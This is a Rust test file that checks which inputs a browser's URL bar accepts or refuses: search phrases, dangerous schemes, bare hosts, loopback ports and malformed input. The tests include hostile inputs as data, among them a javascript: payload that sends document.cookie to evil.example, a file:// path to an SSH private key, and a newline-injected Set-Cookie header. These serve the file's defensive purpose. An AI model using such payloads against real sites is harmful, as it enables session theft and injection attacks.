//! What the URL bar accepts and refuses. Included by `url.rs`.

use super::*;

fn ok(input: &str) -> String {
    normalize_input(input).unwrap_or_else(|e| panic!("{input:?} should normalise, got {e}"))
}

fn err(input: &str) -> UrlError {
    normalize_input(input).unwrap_err()
}

// ---------------------------------------------------------------------------
// The refusal that replaces a search
// ---------------------------------------------------------------------------

#[test]
fn a_search_phrase_is_refused_rather_than_searched() {
    // The governing rule of the module. Every real browser would send these to
    // a search engine; doing that here would put a mistyped internal hostname
    // or a pasted log line onto a third party's servers.
    for phrase in [
        "how do I fix a 500",
        "rust lifetime error",
        "example",
        "budget",
        "the quick brown fox",
    ] {
        match err(phrase) {
            UrlError::NotAnAddress { input } => assert_eq!(input, phrase),
            other => panic!("{phrase:?} should be refused as not-an-address, got {other:?}"),
        }
    }
}

#[test]
fn the_not_an_address_message_says_that_this_browser_does_not_search() {
    // A user who typed a phrase expects something to happen. The message has to
    // say nothing did, and why, or the refusal reads as a broken URL bar.
    let message = err("how do I fix a 500").to_string();
    assert!(message.contains("does not search"), "{message}");
    assert!(message.contains("paste a URL"), "{message}");
}

#[test]
fn a_single_unqualified_label_is_refused_and_not_prefixed() {
    // `budget` is far more often a search phrase than an intranet host. A user
    // who means the host can say so with a scheme, which this accepts.
    assert!(matches!(err("budget"), UrlError::NotAnAddress { .. }));
    assert_eq!(ok("http://budget/"), "http://budget/");
}

// ---------------------------------------------------------------------------
// Refused schemes, each naming itself
// ---------------------------------------------------------------------------

#[test]
fn javascript_is_refused_naming_the_scheme() {
    // The one a user can be talked into pasting, and it executes in whatever
    // page is loaded. The refusal must say which word was the problem.
    match err("javascript:fetch('https://evil.example/'+document.cookie)") {
        UrlError::RefusedScheme { scheme, why } => {
            assert_eq!(scheme, "javascript");
            assert!(why.contains("run script"), "{why}");
        }
        other => panic!("expected a scheme refusal, got {other:?}"),
    }
}

#[test]
fn javascript_is_refused_however_it_is_cased() {
    for spelling in ["JavaScript:alert(1)", "JAVASCRIPT:alert(1)", "jAvAsCrIpT:x"] {
        match err(spelling) {
            UrlError::RefusedScheme { scheme, .. } => assert_eq!(scheme, "javascript"),
            other => panic!("{spelling:?} -> {other:?}"),
        }
    }
}

#[test]
fn every_dangerous_scheme_is_refused_and_names_itself() {
    for (input, expected) in [
        ("data:text/html,<script>alert(1)</script>", "data"),
        ("file:///C:/Users/me/.ssh/id_rsa", "file"),
        ("blob:https://example.com/abc", "blob"),
        ("vbscript:msgbox(1)", "vbscript"),
        ("tauri://localhost/", "tauri"),
        ("asset://localhost/x", "asset"),
        ("ftp://example.com/", "ftp"),
        ("chrome://settings", "chrome"),
        ("ms-settings:privacy", "ms-settings"),
    ] {
        match err(input) {
            UrlError::RefusedScheme { scheme, why } => {
                assert_eq!(scheme, expected, "for {input:?}");
                assert!(!why.is_empty(), "{input:?} refused with no reason");
            }
            other => panic!("{input:?} should be a scheme refusal, got {other:?}"),
        }
    }
}

#[test]
fn about_blank_is_the_only_about_page_accepted() {
    assert_eq!(ok("about:blank"), "about:blank");
    assert_eq!(ok("  ABOUT:BLANK "), "about:blank");
    for other in ["about:config", "about:settings", "about:version"] {
        match err(other) {
            UrlError::RefusedScheme { scheme, why } => {
                assert_eq!(scheme, "about");
                assert!(why.contains("about:blank"), "{why}");
            }
            e => panic!("{other:?} -> {e:?}"),
        }
    }
}

// ---------------------------------------------------------------------------
// The two conveniences
// ---------------------------------------------------------------------------

#[test]
fn a_bare_host_becomes_https_never_http() {
    // Defaulting to http would silently downgrade every address pasted without
    // a scheme.
    assert_eq!(ok("example.com"), "https://example.com");
    assert_eq!(
        ok("app.example.com/orders?id=3"),
        "https://app.example.com/orders?id=3"
    );
    assert_eq!(ok("example.com:8443/x"), "https://example.com:8443/x");
}

#[test]
fn loopback_with_a_port_becomes_http() {
    // A dev server is overwhelmingly plain HTTP, and an https guess fails with
    // a TLS error that names nothing the user can act on.
    assert_eq!(ok("localhost:5173"), "http://localhost:5173");
    assert_eq!(ok("127.0.0.1:8080/health"), "http://127.0.0.1:8080/health");
    assert_eq!(ok("[::1]:3000"), "http://[::1]:3000");
    assert_eq!(ok("localhost"), "http://localhost");
    assert_eq!(ok("api.localhost:9000"), "http://api.localhost:9000");
}

#[test]
fn a_host_with_a_port_is_not_read_as_a_scheme() {
    // `localhost:5173` splits on a colon exactly like `javascript:alert(1)`,
    // and `localhost` is a legal RFC 3986 scheme name, so the grammar alone
    // does not separate them — `split_scheme`'s bare-port test does. Without
    // it every host:port the user types is refused as an unknown scheme, which
    // is what this test caught on its first run.
    assert!(normalize_input("localhost:5173").is_ok());
    assert!(normalize_input("example.com:8080").is_ok());
    assert!(normalize_input("127.0.0.1:9").is_ok());
}

#[test]
fn an_explicit_scheme_always_wins_over_the_inference() {
    // The conveniences are reversible by typing a scheme, which is what makes
    // them acceptable at all.
    assert_eq!(ok("http://example.com"), "http://example.com");
    assert_eq!(ok("https://localhost:5173"), "https://localhost:5173");
    assert_eq!(ok("HTTPS://Example.COM/Path"), "https://Example.COM/Path");
}

#[test]
fn the_scheme_is_lowercased_but_the_path_is_left_exactly_as_typed() {
    // A path and a query are case-sensitive on most servers; "tidying" them is
    // a change to the request the user asked for.
    assert_eq!(
        ok("HTTP://Example.com/Orders/ID?Q=A"),
        "http://Example.com/Orders/ID?Q=A"
    );
}

// ---------------------------------------------------------------------------
// Malformed input
// ---------------------------------------------------------------------------

#[test]
fn empty_input_asks_for_an_address_rather_than_erroring_obscurely() {
    assert_eq!(err(""), UrlError::Empty);
    assert_eq!(err("   \t "), UrlError::Empty);
}

#[test]
fn a_control_character_is_refused_not_stripped() {
    // A newline smuggled into a pasted address is not a typo to be tidied up.
    assert_eq!(
        err("https://example.com/\nSet-Cookie: a=b"),
        UrlError::Malformed
    );
    assert_eq!(err("https://exa\u{0}mple.com"), UrlError::Malformed);
    assert_eq!(err("java\nscript:alert(1)"), UrlError::Malformed);
}

#[test]
fn a_space_inside_a_url_with_a_scheme_is_malformed_not_a_search() {
    // It began with a scheme, so calling it a search phrase would be the wrong
    // explanation of the wrong problem.
    assert_eq!(err("https://example.com/a b"), UrlError::Malformed);
}

#[test]
fn a_scheme_with_no_host_is_refused_naming_that() {
    for input in ["https://", "http://", "https:///path"] {
        match err(input) {
            UrlError::NoHost { .. } => {}
            other => panic!("{input:?} -> {other:?}"),
        }
    }
}

#[test]
fn a_bare_ipv6_literal_is_refused_rather_than_guessed_at() {
    // `::1` is indistinguishable from a host with a port. Guessing which would
    // send a request somewhere the user did not name; brackets are accepted.
    assert!(matches!(err("::1"), UrlError::NotAnAddress { .. }));
    assert!(normalize_input("[::1]").is_ok());
}

#[test]
fn surrounding_whitespace_is_trimmed_because_that_is_a_paste_artefact() {
    assert_eq!(ok("  https://example.com  "), "https://example.com");
    assert_eq!(ok("\texample.com\n"), "https://example.com");
}

#[test]
fn no_refusal_ever_returns_a_url() {
    // The alarm for a future "helpful" fallback. Every error path must produce
    // no address at all, because an address is a network request.
    for input in [
        "search this",
        "javascript:alert(1)",
        "data:text/html,x",
        "",
        "https://",
    ] {
        assert!(
            normalize_input(input).is_err(),
            "{input:?} must not resolve"
        );
    }
}

#[test]
fn an_opaque_scheme_with_a_numeric_body_is_still_refused() {
    // The documented imprecision of the port heuristic: `tel:12345` is read as
    // a host and a port, so the refusal is NotAnAddress rather than
    // RefusedScheme. The message is less precise; the outcome is still that
    // nothing is loaded, which is the property that matters.
    for input in ["tel:12345", "sms:5551234"] {
        assert!(
            normalize_input(input).is_err(),
            "{input:?} must not resolve"
        );
    }
}

#[test]
fn the_hierarchical_form_is_always_read_as_a_scheme() {
    // `//` after the colon is the first and stronger signal, so a scheme whose
    // authority begins with digits is not mistaken for a port.
    assert!(matches!(
        err("ftp://192.168.0.1/x"),
        UrlError::RefusedScheme { .. }
    ));
    assert_eq!(ok("http://192.168.0.1:8080/x"), "http://192.168.0.1:8080/x");
}

#[test]
fn a_scheme_with_an_empty_body_is_not_read_as_a_host() {
    // An empty body is not a port: `https:` must reach the NoHost refusal
    // rather than being treated as a host called "https".
    assert!(matches!(err("https:"), UrlError::NoHost { .. }));
}
